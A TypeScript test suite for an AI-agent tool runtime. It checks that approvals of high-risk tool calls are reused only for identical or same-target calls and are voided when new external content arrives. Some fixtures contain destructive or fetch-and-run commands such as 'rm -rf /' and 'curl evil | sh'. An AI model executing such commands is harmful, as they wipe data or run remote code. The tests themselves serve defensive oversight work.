/**
 * #1250 `confirm-every-step-no-batch`: one confirmation in a turn covers later calls of the same
 * initiator, tool, high-risk category and target while no new source arrived; anything else asks again.
 * Only config / schedule calls share a target; shell, outbound and file writes only an identical call.
 */
import { describe, expect, it, vi } from 'vitest';
import { rootPluginId } from '@zhin.js/plugin-runtime';
import type { ToolCapability } from '../../src/plugin-runtime/capability-ingress.js';
import { PROVENANCE_POLICY, TRUSTED_OUTPUT_TAG, TurnProvenance } from '../../src/security/provenance.js';
import {
  TurnHighRiskConfirmations,
  confirmationCoversAuthority,
  highRiskConfirmationTarget,
} from '../../src/security/high-risk-confirmation-batch.js';
import type { ApprovalOutcome, ApprovalOutcomePort, ApprovalRequestInput } from '../../src/session/approval-port.js';
import { TurnToolRuntime } from '../../src/tool/turn-tool-runtime.js';
import { createScheduleTools } from '../../src/schedule-manager.js';
import { createTurnIngress } from '../../src/turn/turn-ingress.js';

const idSchema = { type: 'object', properties: {
  id: { type: 'string' }, cron: { type: 'string' }, enabled: { type: 'boolean' }, value: {},
} };

// `trusted_output`: the test tools' own results are not recorded sources, so only the batching rule decides.
function capability(name: string, extra: Partial<ToolCapability> = {}): ToolCapability {
  return { owner: rootPluginId(), name, qualifiedName: name, description: name, requiresApproval: 'never',
    source: `/tools/${name}.ts`, execute: vi.fn(async () => 'ok'), inputSchema: idSchema as never,
    tags: [TRUSTED_OUTPUT_TAG], ...extra };
}

function port(answer: (request: ApprovalRequestInput) => ApprovalOutcome = () => ({ status: 'approved', decision: 'approve-once' })) {
  const requests: ApprovalRequestInput[] = [];
  const approval: ApprovalOutcomePort = {
    available: true,
    intentAvailable: true,
    requestApproval: async () => true,
    requestApprovalOutcome: async (request) => { requests.push(request); return answer(request); },
  };
  return { approval, requests };
}

function turn(approval: ApprovalOutcomePort, turnId = 'turn-1') {
  return createTurnIngress({
    intent: { kind: 'new' },
    identity: { rootId: 'root', generation: 1, traceId: 'trace', turnId },
    origin: { kind: 'http', sessionId: 's' },
    principal: { subjectId: 'owner', roles: ['owner'] },
    input: { text: '改一下定时任务' },
    session: { key: 'http:s' },
    policy: { permissions: ['owner'], unattended: false },
    capabilities: { tools: [], skills: [] },
    signal: new AbortController().signal,
    ports: { journal: { append: () => undefined }, approval },
  });
}

function tainted(runtime: TurnToolRuntime): TurnToolRuntime {
  runtime.provenance.record({ kind: 'tool_result', toolName: 'web_fetch' });
  return runtime;
}

describe('TurnToolRuntime batches provenance confirmations within a turn (#1250)', () => {
  it('asks once for repeated calls of the same tool on the same target', async () => {
    const { approval, requests } = port();
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('schedule_update')]));
    await expect(runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 8 * * *' }, 'a')).resolves.toMatchObject({ status: 'completed' });
    await expect(runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 7 * * *' }, 'b')).resolves.toMatchObject({ status: 'completed' });
    await expect(runtime.execute('schedule_update', { id: 'job-1', enabled: false }, 'c')).resolves.toMatchObject({ status: 'completed' });
    expect(requests).toHaveLength(1);
  });

  it('asks again for another tool of the same category on the same target', async () => {
    const { approval, requests } = port();
    const runtime = tainted(new TurnToolRuntime(turn(approval),
      [capability('schedule_update'), capability('schedule_remove'), capability('schedule_pause')]));
    await runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 8 * * *' }, 'a');
    await runtime.execute('schedule_remove', { id: 'job-1' }, 'b');
    await runtime.execute('schedule_pause', { id: 'job-1' }, 'c');
    expect(requests.map(request => request.toolName)).toEqual(['schedule_update', 'schedule_remove', 'schedule_pause']);
  });

  it('asks again once a new source reached the model after the answer', async () => {
    const { approval, requests } = port();
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('schedule_update')]));
    await runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 8 * * *' }, 'a');
    // The same tool read again (another page of `web_fetch`) may carry new instructions: confirmed again.
    runtime.provenance.record({ kind: 'tool_result', toolName: 'web_fetch' });
    await runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 7 * * *' }, 'b');
    expect(requests).toHaveLength(2);
    // A page of another tool read after the answer: confirmed again ...
    runtime.provenance.record({ kind: 'tool_result', toolName: 'web_search' });
    await runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 6 * * *' }, 'c');
    expect(requests).toHaveLength(3);
    // ... and that answer covers the calls after it until the next external content.
    await runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 5 * * *' }, 'd');
    expect(requests).toHaveLength(3);
    runtime.provenance.record({ kind: 'conversation_context', scene: 'group' });
    await runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 4 * * *' }, 'e');
    expect(requests).toHaveLength(4);
  });

  it('asks again after the same tool read other external content (a page fetch of another URL)', async () => {
    const { approval, requests } = port();
    // A fetch-like tool whose results are external content (`web_fetch` itself needs network authority here).
    const fetch = capability('page_fetch', { tags: ['external_content'],
      inputSchema: { type: 'object', properties: { url: { type: 'string' } } } as never });
    const runtime = new TurnToolRuntime(turn(approval), [fetch, capability('update_config')]);
    await expect(runtime.execute('page_fetch', { url: 'https://a.example' }, 'f1')).resolves.toMatchObject({ status: 'completed' });
    await runtime.execute('update_config', { id: 'x', value: 1 }, 'a');
    expect(requests).toHaveLength(1);
    await expect(runtime.execute('page_fetch', { url: 'https://b.example' }, 'f2')).resolves.toMatchObject({ status: 'completed' });
    expect(runtime.provenance.sourceKeys).toEqual(['tool:page_fetch']);
    await runtime.execute('update_config', { id: 'x', value: 2 }, 'b');
    expect(requests).toHaveLength(2);
    // Nothing new since that answer: covered.
    await runtime.execute('update_config', { id: 'x', value: 3 }, 'c');
    expect(requests).toHaveLength(2);
  });

  it('counts a trusted source that becomes external content as new', async () => {
    const { approval, requests } = port();
    const runtime = new TurnToolRuntime(turn(approval), [capability('schedule_update')]);
    runtime.provenance.record({ kind: 'tool_result', toolName: 'weather', trusted: true });
    // `schedule` asks at `untrusted_content` by default: use a config tool, which asks at `any_content`.
    const config = new TurnToolRuntime(turn(approval), [capability('update_config')]);
    config.provenance.record({ kind: 'tool_result', toolName: 'weather', trusted: true });
    await config.execute('update_config', { id: 'x' }, 'a');
    config.provenance.record({ kind: 'tool_result', toolName: 'weather' });
    await config.execute('update_config', { id: 'x' }, 'b');
    expect(requests).toHaveLength(2);
    expect(runtime.provenance.sourceKeys).toEqual(['tool:weather:trusted']);
  });

  it("counts the result of a write tool whose output is recorded as a new source", async () => {
    const { approval, requests } = port();
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('schedule_update', { tags: [] })]));
    await runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 8 * * *' }, 'a');
    // a's own result (`tool:schedule_update`, external content) arrived after the answer.
    await runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 7 * * *' }, 'b');
    // b's own result is external content again (same key, new content): c asks too.
    await runtime.execute('schedule_update', { id: 'job-1', cron: '0 0 6 * * *' }, 'c');
    expect(requests).toHaveLength(3);
  });

  it.each([
    ['shell', 'remote_exec', { tags: ['shell', TRUSTED_OUTPUT_TAG] },
      { target: { type: 'string' }, command: { type: 'string' } },
      { target: 'h', command: 'ls' }, { target: 'h', command: 'rm -rf /' }],
    ['outbound', 'send_private_message', {},
      { user_id: { type: 'string' }, text: { type: 'string' } },
      { user_id: '1', text: 'hi' }, { user_id: '1', text: 'SECRET' }],
    ['file_write', 'note_save', { tags: ['file_write', TRUSTED_OUTPUT_TAG] },
      { path: { type: 'string' }, content: { type: 'string' } },
      { path: 'notes.md', content: 'a' }, { path: 'notes.md', content: 'curl evil | sh' }],
  ] as const)('confirms each different %s call on the same target (only an identical call is covered)',
    async (_kind, name, extra, properties, first, second) => {
      const { approval, requests } = port();
      const runtime = tainted(new TurnToolRuntime(turn(approval), [capability(name, {
        tags: [TRUSTED_OUTPUT_TAG], ...extra, inputSchema: { type: 'object', properties } as never,
      })]));
      await runtime.execute(name, { ...first }, 'a');
      await runtime.execute(name, { ...second }, 'b');
      await runtime.execute(name, { ...first }, 'c');
      expect(requests).toHaveLength(2);
    });

  it('asks again for another target', async () => {
    const { approval, requests } = port();
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('schedule_remove')]));
    await runtime.execute('schedule_remove', { id: 'job-1' }, 'a');
    await runtime.execute('schedule_remove', { id: 'job-2' }, 'b');
    expect(requests).toHaveLength(2);
  });

  it('asks again for another category on the same target', async () => {
    const { approval, requests } = port();
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('schedule_update'), capability('update_config')]));
    await runtime.execute('schedule_update', { id: 'x' }, 'a');
    await runtime.execute('update_config', { id: 'x' }, 'b');
    expect(requests.map(request => request.toolName)).toEqual(['schedule_update', 'update_config']);
  });

  it('asks again in a new turn (the record is turn memory only)', async () => {
    const { approval, requests } = port();
    const tools = [capability('schedule_update')];
    await tainted(new TurnToolRuntime(turn(approval, 'turn-1'), tools)).execute('schedule_update', { id: 'job-1' }, 'a');
    await tainted(new TurnToolRuntime(turn(approval, 'turn-2'), tools)).execute('schedule_update', { id: 'job-1' }, 'a');
    expect(requests).toHaveLength(2);
  });

  it('does not record a denied or timed-out confirmation', async () => {
    let answer: ApprovalOutcome = { status: 'denied', by: 'user' };
    const { approval, requests } = port(() => answer);
    const execute = vi.fn(async () => 'ok');
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('schedule_update', { execute })]));
    await expect(runtime.execute('schedule_update', { id: 'job-1' }, 'a')).resolves.toMatchObject({ status: 'denied', policy: PROVENANCE_POLICY });
    answer = { status: 'timed_out' };
    await expect(runtime.execute('schedule_update', { id: 'job-1' }, 'b')).resolves.toMatchObject({ status: 'denied' });
    answer = { status: 'approved', decision: 'approve-once' };
    await runtime.execute('schedule_update', { id: 'job-1' }, 'c');
    expect(requests).toHaveLength(3);
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('asks again for each call of a human-only tool', async () => {
    const { approval, requests } = port();
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('schedule_update', { requiresApproval: 'human' })]));
    await runtime.execute('schedule_update', { id: 'job-1' }, 'a');
    await runtime.execute('schedule_update', { id: 'job-1' }, 'b');
    expect(requests.filter(request => request.purpose === 'intent')).toHaveLength(2);
  });

  it('does not let an argument the tool does not declare make two calls share a target', async () => {
    const { approval, requests } = port();
    // bash declares only `command`: an injected `id` does not turn two commands into one target.
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('bash_like', {
      tags: ['shell', TRUSTED_OUTPUT_TAG], inputSchema: { type: 'object', properties: { command: { type: 'string' } } } as never,
    })]));
    await runtime.execute('bash_like', { command: 'ls', id: 'same' }, 'a');
    await runtime.execute('bash_like', { command: 'rm -rf data', id: 'same' }, 'b');
    await runtime.execute('bash_like', { command: 'ls', id: 'same' }, 'c');
    expect(requests).toHaveLength(2);
  });

  it('covers an intent-only answer for intent only: the ordinary approval still runs', async () => {
    const { approval, requests } = port(request => request.purpose === 'intent'
      ? { status: 'approved', decision: 'approve-once', scope: 'intent' }
      : { status: 'approved', decision: 'approve-once' });
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('schedule_update', { requiresApproval: 'always' })]));
    await runtime.execute('schedule_update', { id: 'job-1' }, 'a');
    await runtime.execute('schedule_update', { id: 'job-1' }, 'b');
    // a: intent + authorization; b: intent covered, authorization asked again.
    expect(requests.map(request => request.purpose)).toEqual(['intent', 'authorization', 'authorization']);
  });

  it('lets an authority answer also cover the same authorization later in the turn', async () => {
    const { approval, requests } = port();
    const runtime = tainted(new TurnToolRuntime(turn(approval), [capability('schedule_update', { requiresApproval: 'always' })]));
    await runtime.execute('schedule_update', { id: 'job-1' }, 'a');
    await runtime.execute('schedule_update', { id: 'job-1' }, 'b');
    expect(requests.map(request => request.purpose)).toEqual(['intent']);
  });

  it('does not let a confirmation of another tool cover a call that needs authorization', async () => {
    const { approval, requests } = port();
    const runtime = tainted(new TurnToolRuntime(turn(approval), [
      capability('schedule_pause'),
      capability('schedule_update', { requiresApproval: 'always' }),
    ]));
    await runtime.execute('schedule_pause', { id: 'job-1' }, 'a');
    await runtime.execute('schedule_update', { id: 'job-1' }, 'b');
    // b is another tool: its own confirmation, which (from an authority) also settles its authorization.
    expect(requests.map(request => [request.toolName, request.purpose])).toEqual([['schedule_pause', 'intent'], ['schedule_update', 'intent']]);
  });
});

describe('merged turns: each initiator confirms for themselves (#1250)', () => {
  it('asks again when another sender acts on the same target', async () => {
    const { approval, requests } = port();
    const members = [
      { subjectId: 'alice', roles: ['owner'], tools: ['schedule_update'] },
      { subjectId: 'bob', roles: ['owner'], tools: ['schedule_update'] },
    ];
    const merged = createTurnIngress({
      intent: { kind: 'new' },
      identity: { rootId: 'root', generation: 1, traceId: 'trace', turnId: 'merged' },
      origin: { kind: 'http', sessionId: 's' },
      principal: { subjectId: 'alice', roles: ['owner'] },
      input: { text: 'x' },
      session: { key: 'http:s' },
      policy: { permissions: ['owner'], unattended: false, merge: { members } as never },
      capabilities: { tools: [], skills: [] },
      signal: new AbortController().signal,
      ports: { journal: { append: () => undefined }, approval },
    });
    const runtime = tainted(new TurnToolRuntime(merged, [capability('schedule_update')]));
    await runtime.execute('schedule_update', { id: 'job-1', onBehalfOf: 'alice' }, 'a');
    await runtime.execute('schedule_update', { id: 'job-1', onBehalfOf: 'alice' }, 'b');
    await runtime.execute('schedule_update', { id: 'job-1', onBehalfOf: 'bob' }, 'c');
    expect(requests.map(request => request.requesterId)).toEqual(['alice', 'bob']);
  });
});

describe('TurnProvenance.contentEntries (#1250)', () => {
  it('grows with every external arrival, a repeated source and a trusted-to-external upgrade included', () => {
    const provenance = new TurnProvenance();
    provenance.record({ kind: 'tool_result', toolName: 'weather', trusted: true });
    provenance.record({ kind: 'tool_result', toolName: 'weather', trusted: true });
    expect(provenance.contentEntries).toBe(0);
    provenance.record({ kind: 'tool_result', toolName: 'weather' });
    expect(provenance.contentEntries).toBe(1);
    provenance.record({ kind: 'tool_result', toolName: 'web_fetch' });
    provenance.record({ kind: 'tool_result', toolName: 'web_fetch' });
    provenance.record({ kind: 'conversation_context', scene: 'group' });
    expect(provenance.contentEntries).toBe(4);
    expect(provenance.sourceKeys).toEqual(['tool:weather', 'tool:web_fetch', 'conversation_context']);
  });
});

describe('TurnHighRiskConfirmations', () => {
  const base = { turnId: 't', requesterId: 'u', kind: 'schedule' as const, target: 'x' };

  const read = { keys: ['tool:web_fetch'], contentEntries: 1 };
  const plus = (keys: readonly string[], entries = 0) =>
    ({ keys: [...read.keys, ...keys], contentEntries: read.contentEntries + entries });

  it('keys on turn, initiator, category and target', () => {
    const confirmations = new TurnHighRiskConfirmations();
    confirmations.record(base, 'admin', read);
    expect(confirmations.covering(base, read)).toBe('admin');
    for (const other of [{ turnId: 't2' }, { requesterId: 'v' }, { kind: 'config' as const }, { target: 'y' }]) {
      expect(confirmations.covering({ ...base, ...other }, read)).toBeUndefined();
    }
  });

  it('is voided by a source recorded after the answer', () => {
    const confirmations = new TurnHighRiskConfirmations();
    confirmations.record(base, 'admin', read);
    expect(confirmations.covering(base, { keys: [], contentEntries: 1 })).toBe('admin');
    expect(confirmations.covering(base, plus(['tool:web_search'], 1))).toBeUndefined();
    // A later answer given with the new source replaces the voided one, even a weaker one.
    confirmations.record(base, 'intent', plus(['tool:web_search'], 1));
    expect(confirmations.covering(base, plus(['tool:web_search'], 1))).toBe('intent');
  });

  it('is voided by external content recorded after the answer under a key it already had', () => {
    const confirmations = new TurnHighRiskConfirmations();
    confirmations.record(base, 'admin', read);
    expect(confirmations.covering(base, plus([], 1))).toBeUndefined();
    confirmations.record(base, 'intent', plus([], 1));
    expect(confirmations.covering(base, plus([], 1))).toBe('intent');
  });

  it('never weakens a stronger record that still covers the sources', () => {
    const confirmations = new TurnHighRiskConfirmations();
    confirmations.record(base, 'owner', read);
    confirmations.record(base, 'intent', read);
    expect(confirmations.covering(base, read)).toBe('owner');
  });

  it('covers only up to the recorded authority', () => {
    expect(confirmationCoversAuthority('intent', 'admin')).toBe(false);
    expect(confirmationCoversAuthority('admin', 'admin')).toBe(true);
    expect(confirmationCoversAuthority('admin', 'owner')).toBe(false);
    expect(confirmationCoversAuthority('owner', 'owner')).toBe(true);
  });

  it('derives a config / schedule target from declared identifying arguments, else from the whole call', () => {
    const tool = { name: 'schedule_update', owner: 'p', inputSchema: idSchema };
    const target = (view: typeof tool | Readonly<{ name: string; owner: string; mcpServer?: string; inputSchema?: unknown }>, input: Record<string, unknown>) =>
      highRiskConfirmationTarget(view, 'schedule', input);
    expect(target(tool, { id: 'a', cron: '1' })).toBe(target(tool, { id: 'a', cron: '2' }));
    expect(target(tool, { id: 'a' })).not.toBe(target(tool, { id: 'b' }));
    // Another plugin's job with the same id, another tool or another MCP server is another target.
    expect(target(tool, { id: 'a' })).not.toBe(target({ ...tool, owner: 'q' }, { id: 'a' }));
    expect(target(tool, { id: 'a' })).not.toBe(target({ ...tool, name: 'schedule_remove' }, { id: 'a' }));
    expect(target({ ...tool, mcpServer: 'one' }, { id: 'a' })).not.toBe(target({ ...tool, mcpServer: 'two' }, { id: 'a' }));
    // A non-primitive id falls back to the exact call.
    expect(target(tool, { id: { x: 1 } })).toMatch(/^call:/);
    const undeclared = { name: 'run', owner: 'p' };
    expect(target(undeclared, { id: 'a', x: 1 })).not.toBe(target(undeclared, { id: 'a', x: 2 }));
  });

  it('uses the whole call for shell, outbound and file_write, whatever identifying arguments they declare', () => {
    const tool = { name: 'x', owner: 'p', inputSchema: { properties: { target: { type: 'string' }, command: {}, text: {} } } };
    for (const kind of ['shell', 'outbound', 'file_write'] as const) {
      expect(highRiskConfirmationTarget(tool, kind, { target: 'h', command: 'ls' })).toMatch(/^call:/);
      expect(highRiskConfirmationTarget(tool, kind, { target: 'h', command: 'ls' }))
        .not.toBe(highRiskConfirmationTarget(tool, kind, { target: 'h', command: 'rm -rf /' }));
    }
    // Even for config, `command` / `text` are not known value arguments.
    expect(highRiskConfirmationTarget(tool, 'config', { target: 'h', command: 'ls' })).toMatch(/^call:/);
    const config = { name: 'x', owner: 'p', inputSchema: { properties: { target: { type: 'string' }, value: {} } } };
    expect(highRiskConfirmationTarget(config, 'config', { target: 'h', value: 1 })).toMatch(/^target:/);
  });

  it.each([
    ['a differently cased key', { id: { type: 'string' }, Key: { type: 'string' }, value: {} }, { Key: 'a' }, { Key: 'b' }],
    ['field', { id: { type: 'string' }, field: { type: 'string' }, value: {} }, { field: 'token' }, { field: 'admin' }],
    ['jobName', { id: { type: 'string' }, jobName: { type: 'string' } }, { jobName: 'a' }, { jobName: 'b' }],
    ['option', { id: { type: 'string' }, option: { type: 'string' } }, { option: 'a' }, { option: 'b' }],
    ['property', { id: { type: 'string' }, property: { type: 'string' } }, { property: 'a' }, { property: 'b' }],
    ['slug', { id: { type: 'string' }, slug: { type: 'string' } }, { slug: 'a' }, { slug: 'b' }],
    ['uuid', { id: { type: 'string' }, uuid: { type: 'string' } }, { uuid: 'a' }, { uuid: 'b' }],
    ['ref', { id: { type: 'string' }, ref: { type: 'string' } }, { ref: 'a' }, { ref: 'b' }],
    ['index', { id: { type: 'string' }, index: { type: 'number' } }, { index: 0 }, { index: 1 }],
    ['two identifying arguments', { id: { type: 'string' }, user_id: { type: 'string' } }, { user_id: 'a' }, { user_id: 'b' }],
    ['two spellings of one identifier', { id: { type: 'string' }, ID: { type: 'string' } }, { ID: 'a' }, { ID: 'b' }],
  ])('does not let calls that differ in %s share a target', (_label, properties, first, second) => {
    const tool = { name: 'config_update', owner: 'p', inputSchema: { type: 'object', properties } };
    const one = highRiskConfirmationTarget(tool, 'config', { id: 'x', ...first });
    expect(one).toMatch(/^call:/);
    expect(one).not.toBe(highRiskConfirmationTarget(tool, 'config', { id: 'x', ...second }));
  });

  it.each([
    ['a $ref', { $ref: '#/defs/id' }],
    ['no type', {}],
    ['an object type', { type: 'object' }],
    ['a type list', { type: ['string', 'array'] }],
    ['allOf', { allOf: [{ type: 'string' }] }],
  ])('uses the whole call when the identifying argument is declared with %s', (_label, schema) => {
    const tool = { name: 'config_update', owner: 'p', inputSchema: { type: 'object', properties: { id: schema, value: {} } } };
    expect(highRiskConfirmationTarget(tool, 'config', { id: 'x', value: 1 })).toMatch(/^call:/);
  });

  it('uses the whole call when the input carries an argument the tool does not declare', () => {
    const tool = { name: 'config_update', owner: 'p', inputSchema: { type: 'object', properties: { id: { type: 'string' }, value: {} } } };
    expect(highRiskConfirmationTarget(tool, 'config', { id: 'x', value: 1, field: 'a' }))
      .not.toBe(highRiskConfirmationTarget(tool, 'config', { id: 'x', value: 1, field: 'b' }));
  });

  it.each(['prompt', 'description'])('never batches a tool that can rewrite a job\'s %s by target', (field) => {
    const tool = { name: 'schedule_edit', owner: 'p', inputSchema: { type: 'object', properties: {
      id: { type: 'string' }, label: { type: 'string' }, [field]: { type: 'string' },
    } } };
    // A confirmed label change must not cover a later rewrite of what the job does.
    expect(highRiskConfirmationTarget(tool, 'schedule', { id: 'job-1', label: 'a' })).toMatch(/^call:/);
    expect(highRiskConfirmationTarget(tool, 'schedule', { id: 'job-1', [field]: 'evil' }))
      .not.toBe(highRiskConfirmationTarget(tool, 'schedule', { id: 'job-1', label: 'a' }));
  });

  it("batches the Host's schedule_update by its job id", () => {
    const manager = { scheduleFeature: { getStatus: () => [] }, engine: {} as never, agents: () => [] };
    const update = createScheduleTools(manager as never).find(entry => entry.name === 'schedule_update')!;
    const tool = { name: 'schedule_update', owner: 'root', inputSchema: update.definition.inputSchema };
    const target = (input: Record<string, unknown>) => highRiskConfirmationTarget(tool, 'schedule', input);
    expect(target({ id: 'job-1', cron: '0 0 8 * * *' })).toMatch(/^target:/);
    expect(target({ id: 'job-1', cron: '0 0 8 * * *' })).toBe(target({ id: 'job-1', label: 'x', enabled: false }));
    expect(target({ id: 'job-1' })).not.toBe(target({ id: 'job-2' }));
  });

  it.each([
    ['an array-typed id', { id: { type: 'array', items: { type: 'string' } }, cron: {} }],
    ['an id that may be an array', { id: { anyOf: [{ type: 'string' }, { type: 'array' }] } }],
    ['a list of ids', { id: { type: 'string' }, ids: { type: 'array' } }],
    ['a paths list', { key: { type: 'string' }, paths: {} }],
    ['a url', { id: { type: 'string' }, url: {} }],
    ['a recipient', { id: { type: 'string' }, recipient: {} }],
    ['a to address', { id: { type: 'string' }, to: {} }],
    ['a name', { id: { type: 'string' }, name: {} }],
    ['camel / kebab spellings', { id: { type: 'string' }, 'target-ids': {} }],
  ])('falls back to the whole call when the tool declares %s', (_label, properties) => {
    const tool = { name: 'config_apply', owner: 'p', inputSchema: { properties } };
    expect(highRiskConfirmationTarget(tool, 'config', { id: 'a', cron: '1' })).toMatch(/^call:/);
    expect(highRiskConfirmationTarget(tool, 'config', { id: 'a', url: 'https://a' }))
      .not.toBe(highRiskConfirmationTarget(tool, 'config', { id: 'a', url: 'https://b' }));
  });
});
